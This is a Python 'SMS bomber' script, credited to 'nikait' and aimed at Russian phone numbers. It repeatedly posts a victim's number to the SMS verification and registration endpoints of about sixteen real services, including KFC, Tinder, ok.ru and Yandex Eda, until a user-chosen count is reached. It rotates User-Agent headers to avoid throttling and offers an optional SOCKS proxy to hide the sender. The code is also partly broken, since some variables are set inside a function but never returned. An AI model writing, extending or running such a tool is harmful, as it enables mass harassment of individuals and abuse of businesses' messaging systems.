import random
import requests
import datetime
import os

# colours
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

# headers for optimizing sms sent
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
           
           
def check(sent, sms):
    if sent == sms:
        quit()
 

def time(sent):
    a = datetime.datetime.now()
    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
    msg1 = f"{green}{bold}{str(sent)}{end} sms sent!"
    msg2 = f"{green}{bold}{str(time)}{end}"
    if int(sent) < 10:
    	print(f"{msg1}         {msg2}")
    elif int(sent) < 100:
    	print(f"{msg1}        {msg2}")
    elif int(sent) < 1000:
    	print(f"{msg1}       {msg2}")
    elif int(sent) < 10000:
    	print(f"{msg1}      {msg2}")
    else:
        print(f"{msg1}     {msg2}")
    	

def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = str(+7) + number
    number_8 = str(8) + number
    sent = 0
    print("-" * 33)
    print(f"|  {green}{bold}  amount   {end} | {green}{bold}     time     {end} |")
    print("-" * 33)
    HEADERS = random.choice(heads)
    while sent <= sms:
    	try:
    		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    	    requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
    	    sent += 1
    	    time(sent)
    	    check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS) #headers = {}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    	    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
    	    sent += 1
    	    time(sent)
    	    check(sent,sms)
    	except:
    		pass



#header
print(f"{green}{bold}\t\t{underline}[Derived from NI BOMBER 2.4]{end}")

print()
print(f"{bold}coded by{end}", end="")
print(f"{green}{bold} >> {end}", end = "")
print(f"{cyan}{bold}nikait{end}")

print(f"{bold}telegram{end}", end = "")
print(f"{green}{bold} >> {end}", end = "")
print(f"{cyan}{bold}@aaanikit{end}")
print()

def input_from_user():
    #inputs
    print('enter the number without or with prefixes (+7) (8)\nexample: 9018017010')
    global input_number
    input_number = input(green + bold + '>> ' + end)
    print('how many sms to send?')
    sms = int(input(green + bold + '>> ' + end))

    print(f"you need a{cyan} tor {end}y/n? ")
    is_tor = input(bold + green + ">> " + end)


def parse_number(number):
	msg = f"[*]check number - {green}{bold}OK{end}"
	if int(len(number)) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]check number - {red}{bold}failed number!{end}\nThis bomber is intended only for Russia and if the number you entered belongs to another country then alas this bomber is not suitable for you!")
		quit()
	return number
input_from_user()
number = parse_number(input_number)

#tor
if str(is_tor) == "y":
        print(f"[*]launch {cyan}{bold}Tor{end}...")
        proxies = {'http': 'socks5://139.59.53.105:1080','https': 'socks5://139.59.53.105:1080'}
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n',''))
        print(f"[*]launch {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

def Russia():
    os.system("cmd /k python syn_lib/RU.py")

attack(number, sms)
